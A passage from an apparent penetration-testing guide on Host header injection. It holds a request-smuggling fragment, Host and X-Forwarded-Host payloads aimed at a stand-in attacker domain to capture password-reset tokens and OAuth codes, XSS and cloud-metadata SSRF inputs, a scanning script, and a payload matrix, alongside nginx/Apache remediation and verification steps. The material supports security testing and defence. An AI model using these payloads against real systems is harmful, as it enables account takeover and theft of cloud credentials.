Content-Length: 4
Transfer-Encoding: chunked

5b
GET /admin HTTP/1.1
Host: admin.internal.local
Content-Length: 15

x=1
0

```

### 7.2 Host Header + Open Redirect Chain

If the application reflects the Host header in a redirect, chain it with an open redirect on the attacker domain to steal tokens or phish users.

```http
GET /login?redirect=/dashboard HTTP/1.1
Host: attacker.com
```
Response:
```http
HTTP/1.1 302 Found
Location: https://attacker.com/login?redirect=/dashboard
```
*Attacker's server logs the full URL including any sensitive query parameters*

### 7.3 Host Header + Reflected XSS

If the Host header is reflected unsanitized in HTML, achieve XSS without needing a separate vector.

```http
GET / HTTP/1.1
Host: attacker.com"><script>alert(1)</script>
```

**Reflected contexts:**
- `<base href="https://attacker.com"><script>alert(1)</script>/">`
- `<link rel="canonical" href="https://attacker.com"><script>alert(1)</script>">`
- JavaScript: `var host = "attacker.com";alert(1);//";`

### 7.4 Host Header + DNS Rebinding

Force the application to cache a poisoned Host value, then change DNS to point to an internal IP.

1. Set Host to `attacker-controlled.com` (points to attacker server initially)
2. Application caches/configures based on this host
3. Change DNS A record for `attacker-controlled.com` to `169.254.169.254`
4. Application's subsequent requests hit the metadata service

### 7.5 Host Header in API Gateways & Microservices

In microservice architectures, the Host header may determine which upstream service receives the request.

**Kubernetes Ingress Host-based Routing:**
```http
GET /api/users HTTP/1.1
Host: api-internal.default.svc.cluster.local
```
*Bypasses external API gateway and hits internal service directly*

**AWS API Gateway Custom Domain Names:**
```http
GET /prod/api HTTP/1.1
Host: internal-api.execute-api.us-east-1.amazonaws.com
```
*Access to unintended API stages*

### 7.6 Host Header in OAuth / SAML Flows

Poison OAuth callback URLs or SAML AssertionConsumerService URLs via Host header injection.

```http
GET /oauth/authorize?client_id=xxx&redirect_uri=/callback HTTP/1.1
Host: attacker.com
```
*Authorization code delivered to `attacker.com/callback?code=...`*

---

### 8.1 Manual Testing Workflow

For each endpoint and parameter:

1. **Baseline request** — Capture normal request/response
2. **Host replacement** — `Host: attacker.com` → Check reflection in body/headers
3. **Header variation sweep** — Test all 15+ alternative headers individually
4. **Double Host test** — Duplicate Host headers with conflicting values
5. **Absolute URI test** — `GET http://attacker.com/ HTTP/1.1`
6. **HTTP/2 :authority test** — If HTTP/2 is supported
7. **Password reset test** — Submit reset with poisoned Host, check email/links
8. **Cache test** — Check for cache poisoning differential (cache key vs origin processing)
9. **Internal routing test** — Brute-force internal hostnames (`admin.localhost`, `127.0.0.1`, etc.)
10. **SSRF test** — `Host: 169.254.169.254`, `Host: metadata.google.internal`
11. **WAF/filter bypass** — Encoding, case variation, port injection, null bytes
12. **Chain identification** — Request smuggling, open redirect, XSS, OAuth

### 8.2 Automation Script Logic (Python Pseudocode)

```python
import requests

HOST_VARIANTS = [
    "Host",
    "X-Forwarded-Host",
    "X-HTTP-Host-Override",
    "X-Host",
    "X-Original-Host",
    "Forwarded",
    "X-Forwarded-Server",
    ":authority"
]

INTERNAL_HOSTS = [
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "[::1]",
    "admin.internal.local",
    "169.254.169.254",
    "metadata.google.internal",
    "kubernetes.default.svc.cluster.local"
]

def test_host_injection(url, param_value="attacker.com"):
    for header in HOST_VARIANTS:
        headers = {"Host": "example.com"}
        if header == ":authority":
            # HTTP/2 specific handling required
            continue
        headers[header] = param_value
        resp = requests.get(url, headers=headers, allow_redirects=False)
        
        if param_value in resp.text:
            print(f"[REFLECTION] {header}: {param_value} reflected in response body")
        if param_value in resp.headers.get("Location", ""):
            print(f"[REDIRECT] {header}: {param_value} in Location header")
        if "Cache-Control" in resp.headers and "public" in resp.headers["Cache-Control"]:
            print(f"[CACHEABLE] {header}: Response is cacheable - check for cache poisoning")

def test_internal_routing(url):
    for internal in INTERNAL_HOSTS:
        headers = {"Host": internal}
        resp = requests.get(url, headers=headers, allow_redirects=False)
        if resp.status_code == 200 and "example.com" not in resp.text:
            print(f"[VHOST] Host: {internal} returned unique content ({len(resp.text)} bytes)")
```

### 8.3 Recommended Tools

| Tool | Purpose | Notes |
|------|---------|-------|
| **Burp Suite** | Proxy, Repeater, Intruder, Collaborator | Essential; use Collaborator for blind token interception |
| **Burp BApp: Param Miner** | Host header variation detection | Automatically guesses headers and parameters |
| **Burp BApp: HTTP Request Smuggler** | CL.TE/TE.CL detection | For Host + smuggling chains |
| **ffuf** | Virtual host discovery | `ffuf -H "Host: FUZZ.example.com" -w vhosts.txt` |
| **gobuster vhost** | DNS + VHost brute-forcing | `gobuster vhost -u http://example.com -w wordlist.txt` |
| **curl** | Quick header manipulation | `curl -H "Host: attacker.com" http://example.com` |
| **Nuclei** | Automated template scanning | Use `host-header-injection` templates |
| **Interactsh / Burp Collaborator** | Out-of-band detection | For blind token/email interception |
| **Postman** | API endpoint testing | For SOAP/REST API Host header testing |

---

### 9.1 Secure Configuration Patterns

**nginx (Use `$host` or `$server_name`, not user-supplied):**
```nginx
server {
    listen 80;
    server_name example.com www.example.com;
    
    # Reject requests with incorrect Host
    if ($host !~* ^(example.com|www.example.com)$ ) {
        return 444;
    }
    
    # Do not trust X-Forwarded-Host for URL generation
    proxy_set_header Host $host;
}
```

**Apache (Disable UseCanonicalName, validate Host):**
```apache
UseCanonicalName Off
ServerName example.com

<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    
    # Reject unknown Hosts
    <If "%{HTTP_HOST} !~ /^example\.com$/ && %{HTTP_HOST} !~ /^www\.example\.com$/">
        Require all denied
    </If>
</VirtualHost>
```

**Application-Level (URL Generation):**
```python

# NEVER use request headers for URL base
BASE_URL = "https://example.com"  # Hardcoded or config-driven

# If behind a trusted proxy, whitelist allowed proxy headers
TRUSTED_HOSTS = ["example.com", "www.example.com"]
if request.headers.get('X-Forwarded-Host') not in TRUSTED_HOSTS:
    x_forwarded_host = None
```

**Password Reset (Hardcoded Domain):**
```python
reset_url = f"https://example.com/reset-password?token={token}"

### 9.2 Cache Layer Remediation

- **Include all host-derived headers in cache key** or strip them at the cache layer
- **Varnish:** Ensure `X-Forwarded-Host` is not processed by backend for cacheable content, or include it in `hash_data()`
- **CloudFront:** Configure cache policies to not forward `X-Forwarded-Host` unless explicitly required
- **nginx:** Use `proxy_cache_key "$scheme$request_method$host$request_uri";` (use `$host`, not `$http_x_forwarded_host`)

### 9.3 Reverse Proxy Remediation

- **Validate Host header** against a strict whitelist at the edge (load balancer, WAF, ingress controller)
- **Drop unknown Host headers** with 444 (nginx) or 403
- **Do not route based on untrusted headers** (`X-Forwarded-Host` should never override routing decisions unless from a trusted proxy)
- **Use `$server_name`** for internal routing, not `$http_host`

### 9.4 Verification Steps for Fix Validation

1. **Resubmit all attack payloads** — Confirm no reflection, no routing changes, no email poisoning
2. **Test password reset** — Verify reset links always use hardcoded/whitelisted domain
3. **Test cache poisoning** — Confirm cache key and origin processing use the same host source
4. **Test virtual host routing** — Confirm `Host: admin.internal.local` returns 403/444, not admin content
5. **Test SSRF** — Confirm `Host: 169.254.169.254` is rejected or does not trigger internal requests
6. **Test header variations** — Verify `X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded` are ignored or sanitized
7. **Test HTTP/2** — Verify `:authority` is validated identically to `Host`
8. **Test double headers** — Confirm duplicate Host headers are rejected (RFC 7230 violation)
9. **Test absolute URI** — Confirm absolute URI in request line does not bypass Host validation
10. **Verify error handling** — Generic errors only, no internal hostname leakage

### 9.5 Defense-in-Depth

- **Web Application Firewall:** Deploy rules to block `Host` values containing internal IPs, metadata addresses, or unexpected domains
- **Network Segmentation:** Internal admin interfaces should not be routable from the reverse proxy layer
- **Cloud Metadata Protection:** Implement IMDSv2 (session-based) on AWS; require `Metadata-Flavor: Google` on GCP; use Azure IMDS with `Metadata: true` and network controls
- **Monitoring:** Alert on requests with `Host` values matching `169.254.169.254`, `localhost`, or internal DNS patterns
- **HSTS & Secure Cookies:** Mitigate impact of successful Host header injection by preventing protocol downgrade and cookie theft

---

## Quick Reference: Optimized Payload Matrix

| Objective | Payload | Context |
|-----------|---------|---------|
| **Detect Reflection** | `Host: attacker.com` | Any request |
| **X-Forwarded-Host** | `X-Forwarded-Host: attacker.com` | Behind proxies/CDN |
| **Forwarded RFC 7239** | `Forwarded: host=attacker.com` | Modern proxy stacks |
| **HTTP/2 Authority** | `:authority: attacker.com` | HTTP/2 endpoints |
| **Double Host** | `Host: example.com` + `Host: attacker.com` | Parser differential |
| **Absolute URI** | `GET http://attacker.com/ HTTP/1.1` | Proxy desync |
| **Password Reset Poison** | `Host: attacker.com` on `/forgot-password` | Email link theft |
| **Cache Poison** | `X-Forwarded-Host: attacker.com` on cacheable resource | Differential processing |
| **VHost Misroute** | `Host: admin.internal.local` | Internal admin access |
| **AWS SSRF** | `Host: 169.254.169.254` | Metadata extraction |
| **GCP SSRF** | `Host: metadata.google.internal` | GCP token theft |
| **Azure SSRF** | `Host: 169.254.169.254` + `Metadata: true` | Azure metadata |
| **Port Injection** | `Host: example.com:80@attacker.com` | Parser bypass |
| **Null Byte** | `Host: example.com%00.attacker.com` | C-string termination |
| **Subdomain Bypass** | `Host: attacker.com.example.com` | Suffix validation bypass |
| **Request Smuggling** | `Host: example.com` + smuggled `Host: internal.local` | Internal request routing |

---

## Testing Notes

- **Always test with Burp Collaborator or Interactsh** for out-of-band confirmation when testing password reset poisoning or blind SSRF.
- **Test cache poisoning during off-peak hours** and immediately purge the cache after verification to avoid impacting legitimate users.
- **Enumerate internal hostnames aggressively** in Kubernetes/cloud environments; service discovery names often follow predictable patterns.
- **Document the header precedence chain** for the target application (which header wins: Host vs X-Forwarded-Host vs Forwarded).
- **Check HTTP/2 endpoints separately**; many tools downgrade to HTTP/1.1 and miss `:authority` pseudo-header vulnerabilities.
- **When testing SSRF, attempt both the Host header and X-Forwarded-Host**; some applications construct internal requests using different header sources.
- **Be aware of CDN-specific behaviors** (CloudFront cache key policies, Akamai edge logic, Fastly VCL) as they dramatically affect cache poisoning viability.
- **Combine with open redirect testing** — a poisoned Host header that generates `Location: https://attacker.com/...` can steal OAuth codes and session tokens.
